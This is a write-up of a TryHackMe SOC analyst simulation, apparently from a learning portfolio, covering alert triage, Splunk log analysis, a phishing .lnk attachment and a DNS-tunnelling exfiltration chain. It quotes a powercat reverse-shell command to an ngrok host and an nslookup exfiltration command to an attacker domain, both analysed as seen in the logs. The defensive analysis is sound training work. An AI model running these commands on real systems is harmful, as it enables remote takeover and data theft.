# TryHackMe SOC analyst simulation

## Objective

The SOC Analyst Simulation Lab was aimed to establish a safe, controlled environment for the replication of the real-world responsibilities of a SOC analyst. The primary focus was to assess and triage alerts from a centralised dashboard, conduct further log and event analysis in Splunk and finally determine whether alerts were true or false positives. This hands-on experience was designed to deepen understanding of Powershell to safely inspect file contents and analyse logs that display the structure of a DNS tunelling attack - not only understanding how it operates but what it aims to achieve. This project strengthened skills in SIEM analysis, incident triage and basic threat hunting, all skills that align closely with daily tasks performed in a SOC environment.

### Skills Learned

- Advanced understanding of SIEM concepts and practical application.
- Development of critical thinking and problem-solving skills in cybersecurity.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Advanced knowledge of potential malicious powershell commands / scripts

### Tools Used

- Security Information and Event Management (Splunk) system for log ingestion and analysis.
- Powershell to perform OSINT on email file attachments.
- Virtual Lab, to create a sandbox to safely analyse malicious files.
- VirusTotal to check the reputation of email sender's domains.
- Playbook that includes escalation guidelines.

## Steps
- The first screenshot shows the centralised alert dashboard, it displays information such as total alerts, closed alerts, alerts closed as true positives and alerts closed as false positives. On the side bar there are different tools that the user can select, Alert queue, SIEM and analyst VM. There is also some basic documentation, playbooks and case reports.
![Screenshot 2025-04-07 214451](https://github.com/user-attachments/assets/52da7116-5bde-4d62-89ad-ba8b1ebf32b1)
- This screenshot shows all of the current alerts, in order of Severity then Date. The alert queue, allows the user to assign alerts to start the investigation.
![Screenshot 2025-04-07 214546](https://github.com/user-attachments/assets/b76a3053-3ff2-4a69-ab5d-93604a0ee6ff)
- Screenshot shows one of the low severity alerts and is flagged as a potential fishing email. Email is sent from an employee within the IT department and email contains the attachment 'forceupdate.ps1'
![Screenshot 2025-04-07 215911](https://github.com/user-attachments/assets/05896c83-ace1-40fd-959c-0227d00388ad)
- Screenshot of PowerShell script, on a sandboxed virtual machine, 'Get-Content' to safely view the contents of the email. After investigation and anylsis, the conclusion that the script is not harmful and only updates windows and collects diagnostic logs.
![Screenshot 2025-04-07 220344](https://github.com/user-attachments/assets/b7fd2c62-f4d1-4d0c-8239-d1884995d1f8)
- Screenshot shows the closing of the alert as a false positive as zero malicious behaviour was discovered after analysis.
![Screenshot 2025-04-07 221516](https://github.com/user-attachments/assets/8c6d3dc1-cdda-423e-ba16-3ed401608efd)
- Screenshot shows another low severity alert that is flagged as a potential phishing email. Email has an attachment labelled 'ImportantInvoice-February.zip'.
![Screenshot 2025-04-07 221554](https://github.com/user-attachments/assets/2d32ba03-5cc1-434e-8dab-d34373bc2ee3)
- Screenshot shows a PowerShell script on an isolated virtual machine, to unzip the folder and safely examine the contents of the file. 'Expand-Archive' is used to unzip the folder, inside of the unzipped is a file labelled as 'invoice.pdf.lnk'. It is important to note that the file name is 'invoice.pdf', and the actual file extension is .lnk which is the file extension for a shortcut file. This is a common deception tactic used by threat actors, to trick a victim into opening a file that they believe to be non malicious.
![Screenshot 2025-04-07 221700](https://github.com/user-attachments/assets/3a10e0d2-4dfb-411d-9b15-58ed4b293a0f)
- After the command Get-Content is ran on the 'invoice.pdf.lnk' we can see the file contains a powershell script that downloads powercat from github. Powercat is a tool that serves a similar function to netcat. one of the functions of Powercat, and specifically this powershell script, is the ability to establish a reverse shell. From the sceenshot we can see the PowerShell script 'powercat -c 2.tcp.ngrok.io -p 19282 -e powershell' this script serves the function of setting up a reverse PowerShell shell from the victim's machine to a remote server '2.tcp.ngrok.io' using the port 19282, given the threat actor full PowerShell access to the victim's machine. Given all of this information, this alert was able to be marked as a True Positive, and escalated for further analysis and action.
![Screenshot 2025-04-07 221819](https://github.com/user-attachments/assets/69cd3235-a9f6-4085-a4fb-59d283f875f0)
- The next screenshot shows another alert on the alert dashboard, however this particular alert is flagged as medium severity. From the description generated by the alert and the procces.command.line we can see that a network drive was mapped to a local drive with the letter 'Z:' which would require further investigation and analysis of SIEM logs.
![Screenshot 2025-04-07 224120](https://github.com/user-attachments/assets/74b8bab5-c694-4569-8e94-d18f1b2ed94e)
- This screenshot shows a Splunk log from the same host.name as the one that mapped a network drive to a local drive, however this log shows the host creating a file, using PowerShell, within the temp folder, which is commonly used by threat actors as temp folder is writable by regular users and is not normally closely monitored. It is important to note that this file creation happened 2 minutes prior to the mapping of the network drive (the time in the alert dashboard displays 22:03 / 10:03 PM whilst the time in Splunk shows 09:01 PM, this is due to the fact that my Splunk time is formatted to GMT time whislt the alert dashboard was not, these events happened within minutes of eachother not over an hour).
![Screenshot 2025-04-07 224936](https://github.com/user-attachments/assets/11eadfb8-3788-408c-8d91-1bc04068e4c2)
- This next screenshot shows the same user using a command called 'powerview' which is a tool often used by penetration testers and threat actors for data enumeration. In the SIEM log we can see the use of Lighweight Directory Access Protocol (LDAP), this is an example of Active Directory Enumeration, which is apart of the reconnaissance phase for the threat actor to gain more information about the directories on the network system and who has access to these files.
![Screenshot 2025-04-07 225942](https://github.com/user-attachments/assets/ca1008f8-52a5-4d56-9f09-fa5b20d409bf)
- This screenshot shows the SIEM log of the alert that was flagged on the dashboard as medium severity (time of the alert says 09:03 PM and the alert on the dashboard says 10:03 PM, once again this is due to the different time format set up in my Splunk. Given the context that before this network drive was mapped to a local drive, a file was created in the temp folder by the same host using powershell, than the command Powerview was used, just before the drive was mapped, in order to gain more information about the active directory of the system, drastically increases the suspicion this alert.
![Screenshot 2025-04-07 230203](https://github.com/user-attachments/assets/c1c89272-85c5-4aea-8469-c0467152833a)
- Screenshot shows a PowerShell command 'Robocopy.exe' being ran with the flag '/E'. Robocopy is a tool used to efficiently copy files and directories from one directory to another. The log shows the working directory as the 'Z:' drive, which was the local drive that was previously mapped to the network drive labelled as financial records, and all of the data is being copied into a file conveniently labelled as 'exfiltration'.
![Screenshot 2025-04-07 230215](https://github.com/user-attachments/assets/61953c02-4b8e-413b-8154-36249420ca24)
- This screenshot shows the threat actor unmapping the network drive to the local drive 'Z:', in attempt to cover the threat actors tracks.
![Screenshot 2025-04-07 231043](https://github.com/user-attachments/assets/0062ae64-5ebc-4125-80d0-ae221cd21a74)
- Screenshot shows the threat actor creating a zipped file inside of the directory that was used to send all of the copied files using Robocopy.exe. There numerous reasons why a threat actor would zip a file, however the main idea behind zipping a file is to attempt to avoid detection when exfiltrating the data. Zipping a file can significantly reduce the size of a file, allowing for easier exfiltration and reduces the need for multiple exfiltration attempts, zipping a file changes the file extension to .zip, this could help with avoiding detection, if there were security tools in place to scan and detect unusually large .txt files, whereas a .zip file being large may not raise immediate suspicion. Finally, zipping a file could allow the threat actor to apply a password or encryption to the file, making it harder for security tools to access the contents of the file.
![Screenshot 2025-04-07 231059](https://github.com/user-attachments/assets/48631b9a-87b1-49fc-83ab-0d28b2655bf4)
- This screenshot shows the threat actor exfiltrating the data using DNS tunneling. DNS tunneling is a technique in which data is encoded within DNS queires and responses in order to bypass network and security controls. DNS traffic is often always allowed through firewalls and other security measures, making it a reliable way to evade detection whilst carrying out malicious activies such as data exfiltration in this example. In this specific example we can see the PowerShell script "Invoke-Expresion", "nslookup AFBLAwQUAAAACAC90C5XHhl05R8AAA.haz4rdw4re.io" being ran. The specific sub-domain'AFBLAwQUAAAACAC90C5XHhl05R8AAA' is likely where the encoded data is being stored and used to send to the domain 'haz4rdw4re.io' which is likely the C2 server controlled by the threat actor. The threat actor could then see the DNS request made to the server and then decode the exfiltrated data.
![Screenshot 2025-04-07 231213](https://github.com/user-attachments/assets/c7f2d822-c577-4cc2-9245-0a55ee29a2fd)
- Screenshot shows the alert being closed as a True Positive and requiring escalation, due to the severity of the incident and the high possibility of sensitive exfiltrated data. The sceenshot shows the rationale behind the alert being a True Positive (all of the information provided and screenshots beforehand).
![Screenshot 2025-04-07 232841](https://github.com/user-attachments/assets/7bcfcc13-bda8-417d-be73-5e30c821c0c9)
- Final screenshot shows the SOC Simulation Lab being completed and the message 'Security Breach Prevented' after successfully identifying all True Positive Alerts.
![Screenshot 2025-04-08 001331](https://github.com/user-attachments/assets/c4c2964c-86f2-41a7-970c-21f32bb0c61e)






